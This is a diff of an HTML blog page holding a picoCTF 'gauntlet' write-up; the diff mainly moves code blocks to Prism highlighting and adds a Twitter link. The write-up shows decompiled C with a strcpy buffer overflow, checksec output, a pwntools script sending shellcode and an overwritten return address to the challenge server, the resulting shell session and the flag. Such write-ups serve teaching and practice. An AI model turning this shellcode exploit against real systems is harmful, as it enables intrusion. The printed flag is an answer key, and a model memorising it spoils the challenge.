@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -73,14 +74,13 @@
 <p>Comments: Okay, time for a challenge. gauntlet nc mercury.picoctf.net 19968</p>
 <h2 id="write-up">Write up:</h2>
 <p>Opening up the file in a decompiler we see the main function:</p>
-<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
-<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  <span style="color:Blue;">char</span> dest[104]; 
-  <span style="color:Blue;">char</span> *s;
+  char dest[104]; 
+  char *s;
 
-  s = (<span style="color:Blue;">char</span> *)malloc(1000uLL);
-  printf(<span style="color:#A31515;">&quot;%p\n&quot;</span>, dest);
+  s = (char *)malloc(1000uLL);
+  printf("%p\n", dest);
   fflush(_bss_start);
   fgets(s, 1000, stdin);
   s[999] = 0;
@@ -89,22 +89,19 @@
   fgets(s, 1000, stdin);
   s[999] = 0;
   strcpy(dest, s);
-  <span style="color:Blue;">return</span> 0;
-}
-</pre></div>
-</div>
+  return 0;
+}</code></pre>
 <p>I noticed almost immediately that the vulnerability was a buffer overflow since we were copying a 999 character string to a 103 character string.</p>
 <p>There were no references of the flag in the program so I knew that I would need to get shell access to the machine the program was running on.</p>
 <p>First I checked the security on the binary:</p>
-<pre><code>checksec --file=gauntlet                             
+<pre><code class="language-text">checksec --file=gauntlet                             
 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE
-Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               3gauntlet
-</code></pre>
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               3gauntlet</code></pre>
 <p>I saw that NX was disabled which meant that the stack was executable. They gave us the address of dest which was a fairly big hint.</p>
 <p>At this point my plan of attack was to write the shellcode to dest and then do a buffer overflow so that I could overwrite where the return goes to.</p>
 <p>I used cyclic from pwntools to generate a pattern and saw that after 120 characters we would need to write the address we wanted to go to. I then created the following python script:</p>
-<div class="lang-python editor-colors"># import pwn tools
+<pre><code class="language-python"># import pwn tools
 from pwn import *
 
 # open remote process
@@ -135,10 +132,9 @@ payload = shellcode + NOPS + p64(address)
 r.send(payload + b'\n')
 
 # get interactive mode
-r.interactive()
-</div>
+r.interactive()</code></pre>
 <p>Running the script I got:</p>
-<pre><code>[+] Opening connection to mercury.picoctf.net on port 19968: Done
+<pre><code class="language-text">[+] Opening connection to mercury.picoctf.net on port 19968: Done
 [*] Switching to interactive mode
 
 $ ls
@@ -148,12 +144,9 @@ gauntlet_no_aslr
 xinet_startup.sh
 
 $ cat flag.txt
-7504344981b9288c5669150ada84894e
-</code></pre>
+7504344981b9288c5669150ada84894e</code></pre>
 <p>The flag was:</p>
-<pre><code>7504344981b9288c5669150ada84894e
-</code></pre>
-
+<pre><code class="language-text">7504344981b9288c5669150ada84894e</code></pre>
         </article>
 
         <footer class="footer text-left py-2 theme-bg-dark">
@@ -166,5 +159,6 @@ $ cat flag.txt
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
